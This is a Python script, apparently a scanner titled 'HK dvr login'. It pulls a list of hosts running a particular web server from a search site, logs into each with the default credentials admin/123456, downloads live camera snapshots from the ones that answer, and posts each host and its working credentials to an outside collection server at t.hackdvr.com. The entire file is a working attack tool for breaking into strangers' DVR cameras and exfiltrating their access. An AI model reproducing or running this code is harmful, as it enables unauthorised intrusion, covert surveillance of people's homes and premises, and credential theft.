#!/usr/bin/env python
# coding=utf-8

import threading
import requests
import Queue
import json
import sys
import re

reload(sys)
sys.setdefaultencoding('utf8')


def MyThread(iplist):

    threads = []
    queue = Queue.Queue()
    for host in iplist:
        queue.put(host)

    for x in xrange(0, int(sys.argv[1])):
        threads.append(tThread(queue))

    for t in threads:
        t.start()
    for t in threads:
        t.join()


class tThread(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue

    def run(self):

        while not self.queue.empty():
            host = self.queue.get()
            try:
                getinfo(host)
            except:
                continue


def getinfo(host):

    username = "admin"
    password = '123456'
    timeout = 10

    try:
        result = requests.get(url='http://' + host + '/m.html', auth=(username, password), timeout=timeout).text
        title = re.findall(r'<title>(.+?)</title>', result)[0]
        imgsrc = 'http://' + host + '/cgi-bin/net_jpeg.cgi?ch=0&time=1478140502690'
        localPath = sys.path[0]+'/picture/' + host.replace(':', '-') + '.jpg'

        if 'Live' in title:
            try:
                img = requests.get(imgsrc, auth=(username, password), stream=True)
                with open(localPath, 'wb') as f:
                    for chunk in img.iter_content(chunk_size=1024):
                        if chunk:
                            f.write(chunk)
                            f.flush()
                    f.close()
            except Exception, e:
                print e

            aimData = {
                "host": host,
                "username": username,
                "password": password
            }

            saveToServer(aimData)

    except:
        pass


def saveToServer(aimData):
    try:
        result = json.loads(requests.post(url='http://t.hackdvr.com/save_iwatch.php', data=aimData, timeout=15).content)
        if result['code'] == 0:
            print "Save Success!"
        else:
            print "Save Failed!"

    except Exception, e:
        saveToServer(aimData)


if __name__ == '__main__':
    print '\n*************** HK dvr login ****************'
    print '              Author 92ez.com'
    print '       You should know what U R doing!'
    print '*********************************************\n'

    print '[*] Request to header.telnetscan.org ...'
    content1 = requests.get('http://header.telnetscan.org/search.php?s=mini_httpd/1.19 19dec2003').content

    content = content1
    iplist = re.findall(r'href="http://(.+?)">',content)

    print '[*] Total '+str(len(iplist))+" items..."
    print '[*] Running...\n'

    try:
        MyThread(iplist)
    except KeyboardInterrupt:
        print 'Keyboard Interrupt!'
        sys.exit()